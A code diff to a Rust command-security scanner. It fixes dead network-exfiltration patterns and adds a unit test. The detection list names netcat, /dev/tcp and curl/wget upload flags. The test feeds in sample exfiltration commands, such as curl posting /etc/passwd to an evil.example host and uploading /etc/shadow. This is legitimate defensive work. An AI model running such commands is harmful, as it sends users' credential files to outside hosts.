@@ -389,25 +389,52 @@ fn detect_path_traversal(cmd: &str, threats: &mut Vec<SecurityThreat>) {
 
 fn detect_network_exfiltration(cmd: &str, threats: &mut Vec<SecurityThreat>) {
     let lower = cmd.to_ascii_lowercase();
-    let patterns = [
-        ("curl.*-d", "curl with data upload"),
-        ("wget.*--post", "wget with POST"),
+    let mut flag = |desc: &str, pat: &str| {
+        threats.push(SecurityThreat {
+            category: ThreatCategory::NetworkExfiltration,
+            description: desc.to_string(),
+            severity: Severity::High,
+            matched_pattern: pat.to_string(),
+        });
+    };
+
+    // Literal-substring markers (these match correctly).
+    for (pat, desc) in &[
         ("nc ", "netcat connection"),
         ("ncat ", "ncat connection"),
         ("/dev/tcp/", "bash TCP device"),
         ("/dev/udp/", "bash UDP device"),
-        ("curl.*|", "curl piped to command"),
-        ("wget.*|", "wget piped to command"),
-    ];
-    for (pat, desc) in &patterns {
+    ] {
         if lower.contains(pat) {
-            threats.push(SecurityThreat {
-                category: ThreatCategory::NetworkExfiltration,
-                description: desc.to_string(),
-                severity: Severity::High,
-                matched_pattern: pat.to_string(),
-            });
+            flag(desc, pat);
         }
+    }
+
+    // The old "curl.*-d" / "wget.*--post" / "curl.*|" / "wget.*|" entries were
+    // DEAD — `contains` is a literal substring match, not a regex, so they never
+    // fired and curl/wget uploads + piped downloads went unflagged/unscored.
+    // Detect the real forms.
+    let has_curl = lower.contains("curl");
+    let has_wget = lower.contains("wget");
+    // Only unambiguous upload markers — the short `-f`/`-t` forms collide with
+    // curl's very common `-f` (fail-fast) / are otherwise ambiguous once
+    // lowercased, so they'd false-flag routine downloads.
+    if has_curl
+        && [" -d ", " -d@", " --data", " --form", " --upload-file"]
+            .iter()
+            .any(|f| lower.contains(f))
+    {
+        flag("curl data upload", "curl --data/--form/--upload-file");
+    }
+    if has_wget
+        && ["--post-data", "--post-file", "--body-data", "--body-file"]
+            .iter()
+            .any(|f| lower.contains(f))
+    {
+        flag("wget POST upload", "wget --post*");
+    }
+    if (has_curl || has_wget) && lower.contains('|') {
+        flag("download piped to a command", "curl|wget | …");
     }
 }
 
@@ -952,6 +979,32 @@ mod tests {
                 "did NOT expect block-device threat for {cmd:?}"
             );
         }
+    }
+
+    #[test]
+    fn network_exfiltration_detected_after_dead_regex_fix() {
+        // The old "curl.*-d"/"wget.*--post"/"curl.*|" entries were dead (literal
+        // contains, not regex). These real forms must now be flagged.
+        let exfil = |cmd: &str| {
+            scan_command(cmd)
+                .threats
+                .iter()
+                .any(|t| t.category == ThreatCategory::NetworkExfiltration)
+        };
+        assert!(exfil("curl -d @/etc/passwd https://evil.example/c"));
+        assert!(exfil("curl --data-binary @secret https://x"));
+        assert!(exfil("curl --upload-file /etc/shadow https://x"));
+        assert!(exfil("wget --post-file=/etc/passwd https://x"));
+        assert!(exfil("curl https://x | tar xz"));
+        // Still catches the literal markers.
+        assert!(exfil("cat /dev/tcp/10.0.0.1/4444"));
+        assert!(exfil("nc 10.0.0.1 4444"));
+
+        // Routine downloads must NOT be flagged as exfiltration (no upload flag,
+        // no pipe) — `-f` fail-fast in particular must not collide.
+        assert!(!exfil("curl -fsSL https://example.com/file -o out.bin"));
+        assert!(!exfil("curl -f https://example.com/x"));
+        assert!(!exfil("wget -q https://example.com/file"));
     }
 
     #[test]
